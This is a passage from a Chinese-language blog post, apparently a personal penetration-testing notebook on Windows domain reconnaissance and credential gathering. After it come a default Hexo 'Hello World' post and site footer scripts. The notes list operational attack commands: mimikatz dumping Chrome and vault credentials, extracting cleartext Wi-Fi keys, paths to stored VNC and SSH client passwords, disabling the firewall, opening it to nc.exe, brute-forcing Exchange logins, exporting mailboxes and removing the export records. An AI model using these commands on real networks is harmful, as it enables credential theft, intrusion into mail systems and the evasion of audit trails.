<h3 id="查看hosts文件"><a href="#查看hosts文件" class="headerlink" title="查看hosts文件"></a>查看hosts文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type  c:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>

<h3 id="查看DNS"><a href="#查看DNS" class="headerlink" title="查看DNS"></a>查看DNS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /displaydns</span><br></pre></td></tr></table></figure>

<p>在WINSERVER上，使用dnscmd获取DNS记录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dnscmd /ZonePrint hack.local</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210806104621284.png" alt="image-20210806104621284"></p>
<p>非WINSERVER机器上，使用PowerView.ps1</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import-module</span> PowerView.ps1</span><br><span class="line"><span class="built_in">Get-DNSRecord</span> <span class="literal">-ZoneName</span> hack.local</span><br></pre></td></tr></table></figure>

<p><img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210806104911527.png" alt="image-20210806104911527"></p>
<h3 id="nbtscan、nmap"><a href="#nbtscan、nmap" class="headerlink" title="nbtscan、nmap"></a>nbtscan、nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 192.168.1.4/24</span><br></pre></td></tr></table></figure>

<h3 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;   #利用ICMP协议快速探测内网</span><br></pre></td></tr></table></figure>

<h3 id="arp-exe"><a href="#arp-exe" class="headerlink" title="arp.exe"></a>arp.exe</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp.exe –t 192.168.1.0/20  #arp-scan工具，需要上传arp.exe</span><br></pre></td></tr></table></figure>

<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\windows\temp\InvokeARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/24&#125;&quot; &gt;&gt; C:\windows\temp\log.txt  </span><br><span class="line">#使用Nishang中的Invoke-ARPScan.ps1脚本，可以将脚本上传到目标主机执行，也可以直接远程加载执行</span><br></pre></td></tr></table></figure>

<h3 id="scanline"><a href="#scanline" class="headerlink" title="scanline"></a>scanline</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scanline -h -t 22,80- 89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.1.1-254 /b   </span><br><span class="line">#使用ScanLine对常规 TCP/UDP 端口扫描探测内网</span><br></pre></td></tr></table></figure>

<h2 id="会话信息"><a href="#会话信息" class="headerlink" title="会话信息"></a>会话信息</h2><blockquote>
<p>用于查看管理员（或某用户）登录过哪些机器，机器被哪些用户登陆过</p>
</blockquote>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerView  https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span><br></pre></td></tr></table></figure>

<p>查看用户登录过哪些机器</p>
<p><img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805230416357.png" alt="image-20210805230416357"></p>
<p>查询机器被哪些用户登录过</p>
<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805230523704.png" alt="image-20210805230523704" style="zoom: 67%;">

<h2 id="凭据信息"><a href="#凭据信息" class="headerlink" title="凭据信息"></a>凭据信息</h2><h3 id="navicat"><a href="#navicat" class="headerlink" title="navicat"></a>navicat</h3><table>
<thead>
<tr>
<th>MySQL</th>
<th>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;your  connection name&gt;</th>
</tr>
</thead>
<tbody><tr>
<td>MariaDB</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>MongoDB</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>Microsoft  SQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>Oracle</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>SQLite</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;your  connection name&gt;</td>
</tr>
</tbody></table>
<h3 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h3><table>
<thead>
<tr>
<th>xp/win2003</th>
<th>C:\Documents  and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</th>
</tr>
</thead>
<tbody><tr>
<td>win7/win2008以上</td>
<td>C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td>
</tr>
</tbody></table>
<h3 id="Xshell"><a href="#Xshell" class="headerlink" title="Xshell"></a>Xshell</h3><table>
<thead>
<tr>
<th>Xshell 5</th>
<th>%userprofile%\Documents\NetSarang\Xshell\Sessions</th>
</tr>
</thead>
<tbody><tr>
<td>Xshell 6</td>
<td>%userprofile%\Documents\NetSarang  Computer\6\Xshell\Sessions</td>
</tr>
</tbody></table>
<h3 id="WinSCP"><a href="#WinSCP" class="headerlink" title="WinSCP"></a>WinSCP</h3><table>
<thead>
<tr>
<th>HKCU\Software\Martin  Prikryl\WinSCP 2\Sessions</th>
</tr>
</thead>
</table>
<h3 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h3><table>
<thead>
<tr>
<th>RealVNC</th>
<th>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver</th>
<th>Password</th>
</tr>
</thead>
<tbody><tr>
<td>TightVNC</td>
<td>HKEY_CURRENT_USER\Software\TightVNC\Server  Value</td>
<td>Password  or PasswordViewOnly</td>
</tr>
<tr>
<td>TigerVNC</td>
<td>HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4</td>
<td>Password</td>
</tr>
<tr>
<td>UltraVNC</td>
<td>C:\Program  Files\UltraVNC\ultravnc.ini</td>
<td>passwd or  passwd2</td>
</tr>
</tbody></table>
<h3 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey/list</span><br></pre></td></tr></table></figure>

<h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><h3 id="解密Chrome密码："><a href="#解密Chrome密码：" class="headerlink" title="解密Chrome密码："></a>解密Chrome密码：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login  Data&quot; /unprotect</span><br></pre></td></tr></table></figure>

<h3 id="解密Credential："><a href="#解密Credential：" class="headerlink" title="解密Credential："></a>解密Credential：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz vault::cred /patch</span><br></pre></td></tr></table></figure>

<h2 id="域信任"><a href="#域信任" class="headerlink" title="域信任"></a>域信任</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure>

<h2 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup  -type=ns domain.comnslookupsserver  dns.domain.comls  domain.com</span><br></pre></td></tr></table></figure>

<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig  @dns.domain.com axfr domain.com</span><br></pre></td></tr></table></figure>

<h2 id="WIFI"><a href="#WIFI" class="headerlink" title="WIFI"></a>WIFI</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>

<h2 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h2><p>学习提权的时候再做了解</p>
<h2 id="其他基础信息收集"><a href="#其他基础信息收集" class="headerlink" title="其他基础信息收集"></a>其他基础信息收集</h2><h3 id="获取当前shell权限"><a href="#获取当前shell权限" class="headerlink" title="获取当前shell权限"></a>获取当前shell权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user &amp;&amp; whoami /priv</span><br></pre></td></tr></table></figure>

<p>别看到普通权限就提权，实在没法深入再提权。</p>
<p>提权可能打崩服务器，或者不免杀触发警报。</p>
<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210806105745713.png" alt="image-20210806105745713" style="zoom: 67%;">

<h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>主要关注修补程序</p>
<h3 id="机器名"><a href="#机器名" class="headerlink" title="机器名"></a>机器名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>

<h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic OS get Caption,CSDVersion,OSArchitecture,Version</span><br></pre></td></tr></table></figure>

<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ver</span><br></pre></td></tr></table></figure>

<h3 id="查看杀软"><a href="#查看杀软" class="headerlink" title="查看杀软"></a>查看杀软</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</span><br></pre></td></tr></table></figure>

<h3 id="查看当前安装程序"><a href="#查看当前安装程序" class="headerlink" title="查看当前安装程序"></a>查看当前安装程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>

<h3 id="查看在线用户"><a href="#查看在线用户" class="headerlink" title="查看在线用户"></a>查看在线用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quser</span><br></pre></td></tr></table></figure>

<h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v    #/v可以查看是谁开启的进程</span><br></pre></td></tr></table></figure>

<h3 id="查看当前登录域"><a href="#查看当前登录域" class="headerlink" title="查看当前登录域"></a>查看当前登录域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<h3 id="查询并开启RDP"><a href="#查询并开启RDP" class="headerlink" title="查询并开启RDP"></a>查询并开启RDP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber    #查看远程连接端口</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #在 Windows Server 2003 中开启 3389 端口</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1  </span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

<h3 id="查看RDP连接历史"><a href="#查看RDP连接历史" class="headerlink" title="查看RDP连接历史"></a>查看RDP连接历史</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure>

<h3 id="查看防火墙配置"><a href="#查看防火墙配置" class="headerlink" title="查看防火墙配置"></a>查看防火墙配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable  			  #winserver2003及之前版本 关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off   #winserver2003之后版本 关闭防火墙</span><br><span class="line">netsh firewall show config #查看防火墙配置</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable  #Windows Server 2003 系统及之前版本，允许指定程序全部连接</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;  				#Windows Server 2003 之后系统版本允许指定程序连入</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;  				# 允许指定程序连出</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow   #允许 3389 端口放行</span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot; 								#自定义防火墙日志储存位置</span><br></pre></td></tr></table></figure>

<h2 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h2><p>exchange一般都在域内的核心位置上，包括甚至安装在域控服务器上，因此需要exchange的相关漏洞，如果拿下exchange机器，则域控也不远了。</p>
<h3 id="邮箱用户密码爆破"><a href="#邮箱用户密码爆破" class="headerlink" title="邮箱用户密码爆破"></a>邮箱用户密码爆破</h3><p>使用ruler工具对owa接口进行爆破：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ruler --domain targetdomain.com brute --users /path/to/user.txt --passwords /path/to/passwords.txt</span><br></pre></td></tr></table></figure>

<p>ruler工具会自动搜索owa可以爆破的接口，如：</p>
<p><a target="_blank" rel="noopener" href="https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml">https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml</a></p>
<p>其他如ews接口也存在被暴力破解利用的风险：</p>
<p><a target="_blank" rel="noopener" href="https://mail.targetdomain.com/ews">https://mail.targetdomain.com/ews</a></p>
<h3 id="通讯录收集"><a href="#通讯录收集" class="headerlink" title="通讯录收集"></a>通讯录收集</h3><p>在获取一个邮箱账号密码后，可以使用MailSniper收集通讯录，当拿到通讯录后，可以再次利用上述爆破手段继续尝试弱密码，但是记住，密码次数不要太多，很有可能会造成域用户锁定：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>当我们拿下exchange服务器后，可以做一些信息收集，包括不限于用户、邮件。</p>
<p>获取所有邮箱用户：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Mailbox</span><br></pre></td></tr></table></figure>

<p>导出邮件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MailboxexportRequest -mailbox username -FilePath (&quot;\\localhost\c$\test\username.pst&quot;)</span><br></pre></td></tr></table></figure>

<p>也可以通过web口导出，登录：</p>
<p><a target="_blank" rel="noopener" href="https://mail.domain.com/ecp/">https://mail.domain.com/ecp/</a></p>
<p>导出后会有记录，用如下命令可以查看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-MailboxExportRequest</span><br></pre></td></tr></table></figure>

<p>删除某个导出记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-MailboxExportRequest -Identity &#x27;username\mailboxexport&#x27; -Confirm:$false</span><br></pre></td></tr></table></figure>



<h2 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h2><h2 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h2><p>可以了解，都不推荐使用</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-hello-world"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/09/14/hello-world/"
    >Hello World</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2021/09/14/hello-world/" class="article-date">
  <time datetime="2021-09-14T04:57:41.212Z" itemprop="datePublished">2021-09-14</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" rel="tag">工具使用</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
  </article>
  

  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2015-2021
        <i class="ri-heart-fill heart_icon"></i> John Doe
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Hexo"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" target="_blank" rel="noopener" href="http://shenyu-vip.lofter.com">摄影</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2019/about">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->

<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
